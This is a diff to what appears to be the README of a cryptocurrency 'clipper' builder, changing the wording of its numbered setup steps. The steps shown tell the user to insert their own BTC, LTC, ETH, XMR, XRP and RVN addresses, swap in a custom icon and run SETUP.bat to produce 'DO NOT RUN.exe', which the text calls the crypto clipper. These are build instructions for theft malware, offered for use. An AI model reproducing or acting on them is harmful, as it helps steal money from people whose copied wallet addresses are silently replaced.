@@ -12,8 +12,8 @@ It Supports BTC, LTC, ETH, XMR, XRP, RVN Addresses
 2. Download [Python](https://www.python.org/downloads/) And Make Sure To Add It To Path
 3. Edit "DO NOT RUN.py", And Change The Crypto Address Placeholders, With Your Own Crypto Addresses
 4. If You Want A Custom Icon, Replace The "1.ico" File With Your Own .ico File
-5. Run "SETUP.bat" & Wait For It To Finish
-6. New Folders/Files Will Appear In The Directory You Run "SETUP.bat"
+5. Run "SETUP.bat"
+6. After The Program Finished, New Folders/Files Will Appear In The Directory You Run "SETUP.bat"
 7. There Should Be A Folder Named "dist"
 8. Inside The "dist" Folder, There Will Be A File Named "DO NOT RUN.exe"
 9. That .exe File Is The Crypto Clipper
